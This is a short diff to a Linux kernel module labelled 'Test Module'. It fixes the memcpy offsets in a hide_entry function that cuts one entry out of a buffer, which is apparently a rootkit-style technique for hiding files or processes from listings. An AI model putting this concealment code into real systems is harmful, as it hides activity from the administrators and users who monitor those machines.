@@ -119,8 +119,6 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yarin");
 MODULE_DESCRIPTION("Test Module");
 
-
-
 unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter){
     unsigned long offset = 0;
 
@@ -144,7 +142,7 @@ unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryF
         // [0, 1, 2, 3, 4]
         // -----[        ] dest
         // --------[     ] source
-        memcpy(buffer + offset,  buffer + offset + hide_entry_size, (size - offset - hide_entry_size));
+        memcpy(buffer + hide_entry_offset,  buffer + hide_entry_offset + hide_entry_size, (size - hide_entry_offset - hide_entry_size));
         return size - hide_entry_size;
     }
 
